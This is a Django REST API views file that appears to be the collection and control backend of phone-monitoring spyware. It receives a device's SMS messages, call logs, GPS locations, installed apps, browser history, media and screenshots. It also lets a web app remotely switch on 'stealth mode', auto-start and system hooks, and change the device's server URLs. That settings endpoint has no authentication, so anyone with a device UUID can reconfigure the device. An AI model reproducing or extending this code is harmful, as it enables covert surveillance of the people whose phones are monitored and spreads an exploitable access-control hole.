"""
API Views
@author Michael KOJDL
@version 1.0.0
"""
from rest_framework import status, viewsets
from rest_framework.decorators import api_view, permission_classes
from rest_framework.response import Response
from rest_framework.permissions import AllowAny, IsAuthenticated
from django.utils import timezone
from .serializers import (
    RegisterDeviceSerializer,
    SmsMessageSerializer,
    CallLogSerializer,
    LocationSerializer,
    InstalledAppSerializer,
    BrowserHistorySerializer,
    MediaFileSerializer,
    ScreenshotSerializer
)
from apps.monitoring_sms.models import SmsMessage
from apps.monitoring_calls.models import CallLog
from apps.monitoring_location.models import Location
from apps.monitoring_apps.models import InstalledApp
from apps.monitoring_browser.models import BrowserHistory
from apps.monitoring_media.models import MediaFile
from apps.monitoring_screenshots.models import Screenshot


@api_view(['GET'])
@permission_classes([AllowAny])
def health_check(request):
    """
    Health check endpoint for Docker/K8s
    GET /api/v1/health
    """
    return Response({
        'status': 'healthy',
        'timestamp': timezone.now().isoformat(),
        'version': '2.0.0'
    }, status=status.HTTP_200_OK)


@api_view(['POST'])
@permission_classes([AllowAny])
def register_device(request):
    """
    Register new device
    POST /api/v1/register
    """
    serializer = RegisterDeviceSerializer(data=request.data)
    if serializer.is_valid():
        device = serializer.save()
        return Response({
            'result': 'ok',
            'uuid': device.uuid,
            'api_key': device.api_key,
            'timestamp': device.created_at.isoformat(),
            'version': '1.0.0'
        }, status=status.HTTP_201_CREATED)

    return Response({
        'result': 'error',
        'message': serializer.errors
    }, status=status.HTTP_400_BAD_REQUEST)


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def upload_sms(request):
    """
    Upload SMS data
    POST /api/v1/sms
    """
    # Support both single and bulk upload
    many = isinstance(request.data, list)
    serializer = SmsMessageSerializer(
        data=request.data,
        many=many,
        context={'request': request}
    )

    if serializer.is_valid():
        serializer.save()
        count = len(serializer.data) if many else 1
        return Response({
            'result': 'ok',
            'created': count,
            'timestamp': timezone.now().isoformat()
        }, status=status.HTTP_201_CREATED)

    return Response({
        'result': 'error',
        'message': serializer.errors
    }, status=status.HTTP_400_BAD_REQUEST)


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def upload_calls(request):
    """
    Upload call logs
    POST /api/v1/calls
    """
    many = isinstance(request.data, list)
    serializer = CallLogSerializer(
        data=request.data,
        many=many,
        context={'request': request}
    )

    if serializer.is_valid():
        serializer.save()
        count = len(serializer.data) if many else 1
        return Response({
            'result': 'ok',
            'created': count
        }, status=status.HTTP_201_CREATED)

    return Response({
        'result': 'error',
        'message': serializer.errors
    }, status=status.HTTP_400_BAD_REQUEST)


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def upload_location(request):
    """
    Upload GPS locations
    POST /api/v1/location
    """
    many = isinstance(request.data, list)
    serializer = LocationSerializer(
        data=request.data,
        many=many,
        context={'request': request}
    )

    if serializer.is_valid():
        serializer.save()
        # Update device last_seen
        request.device.last_seen = timezone.now()
        request.device.save(update_fields=['last_seen'])

        count = len(serializer.data) if many else 1
        return Response({
            'result': 'ok',
            'created': count
        }, status=status.HTTP_201_CREATED)

    return Response({
        'result': 'error',
        'message': serializer.errors
    }, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET'])
@permission_classes([IsAuthenticated])
def device_status(request):
    """
    Get device status
    GET /api/v1/status
    """
    device = request.device
    return Response({
        'device_uuid': device.uuid,
        'status': 'ONLINE' if device.is_active else 'OFFLINE',
        'last_seen': device.last_seen.isoformat() if device.last_seen else None,
        'manufacturer': device.manufacturer,
        'model': device.model,
        'os_version': device.os_version
    })


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def upload_apps(request):
    """
    Upload installed apps
    POST /api/v1/apps
    """
    many = isinstance(request.data, list)
    serializer = InstalledAppSerializer(
        data=request.data,
        many=many,
        context={'request': request}
    )

    if serializer.is_valid():
        serializer.save()
        count = len(serializer.data) if many else 1
        return Response({
            'result': 'ok',
            'created': count
        }, status=status.HTTP_201_CREATED)

    return Response({
        'result': 'error',
        'message': serializer.errors
    }, status=status.HTTP_400_BAD_REQUEST)


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def upload_browser_history(request):
    """
    Upload browser history
    POST /api/v1/browser-history
    """
    many = isinstance(request.data, list)
    serializer = BrowserHistorySerializer(
        data=request.data,
        many=many,
        context={'request': request}
    )

    if serializer.is_valid():
        serializer.save()
        count = len(serializer.data) if many else 1
        return Response({
            'result': 'ok',
            'created': count
        }, status=status.HTTP_201_CREATED)

    return Response({
        'result': 'error',
        'message': serializer.errors
    }, status=status.HTTP_400_BAD_REQUEST)


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def upload_media(request):
    """
    Upload media files
    POST /api/v1/media
    """
    many = isinstance(request.data, list)
    serializer = MediaFileSerializer(
        data=request.data,
        many=many,
        context={'request': request}
    )

    if serializer.is_valid():
        serializer.save()
        count = len(serializer.data) if many else 1
        return Response({
            'result': 'ok',
            'created': count
        }, status=status.HTTP_201_CREATED)

    return Response({
        'result': 'error',
        'message': serializer.errors
    }, status=status.HTTP_400_BAD_REQUEST)


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def upload_screenshots(request):
    """
    Upload screenshots
    POST /api/v1/screenshots
    """
    many = isinstance(request.data, list)
    serializer = ScreenshotSerializer(
        data=request.data,
        many=many,
        context={'request': request}
    )

    if serializer.is_valid():
        serializer.save()
        count = len(serializer.data) if many else 1
        return Response({
            'result': 'ok',
            'created': count
        }, status=status.HTTP_201_CREATED)

    return Response({
        'result': 'error',
        'message': serializer.errors
    }, status=status.HTTP_400_BAD_REQUEST)


@api_view(['GET'])
@permission_classes([IsAuthenticated])
def get_device_settings(request):
    """
    Get device settings for remote control
    GET /api/v1/settings

    Returns current device settings that can be modified remotely from WebApp
    """
    try:
        device = request.device

        # Get or create settings for this device
        from apps.devices.models import DeviceSettings
        settings, created = DeviceSettings.objects.get_or_create(device=device)

        from apps.api.serializers import DeviceSettingsSerializer
        serializer = DeviceSettingsSerializer(settings)

        return Response({
            'result': 'ok',
            'settings': serializer.data
        }, status=status.HTTP_200_OK)

    except Exception as e:
        return Response({
            'result': 'error',
            'message': str(e)
        }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


@api_view(['PUT', 'PATCH'])
@permission_classes([AllowAny])  # Allow WebApp to update without device auth
def update_device_settings(request, device_uuid):
    """
    Update device settings remotely (called by WebApp)
    PUT/PATCH /api/v1/devices/{uuid}/settings

    Allows WebApp to remotely change device configuration:
    - API and WebSocket URLs
    - Stealth mode
    - Auto-start
    - System hooks enable/disable
    - Module enable/disable
    - Sync interval
    """
    try:
        from apps.devices.models import Device, DeviceSettings

        # Find device by UUID
        try:
            device = Device.objects.get(uuid=device_uuid)
        except Device.DoesNotExist:
            return Response({
                'result': 'error',
                'message': 'Device not found'
            }, status=status.HTTP_404_NOT_FOUND)

        # Get or create settings
        settings, created = DeviceSettings.objects.get_or_create(device=device)

        # Update settings
        from apps.api.serializers import DeviceSettingsSerializer
        serializer = DeviceSettingsSerializer(
            settings,
            data=request.data,
            partial=(request.method == 'PATCH')
        )

        if serializer.is_valid():
            serializer.save()
            return Response({
                'result': 'ok',
                'settings': serializer.data
            }, status=status.HTTP_200_OK)

        return Response({
            'result': 'error',
            'message': serializer.errors
        }, status=status.HTTP_400_BAD_REQUEST)

    except Exception as e:
        return Response({
            'result': 'error',
            'message': str(e)
        }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
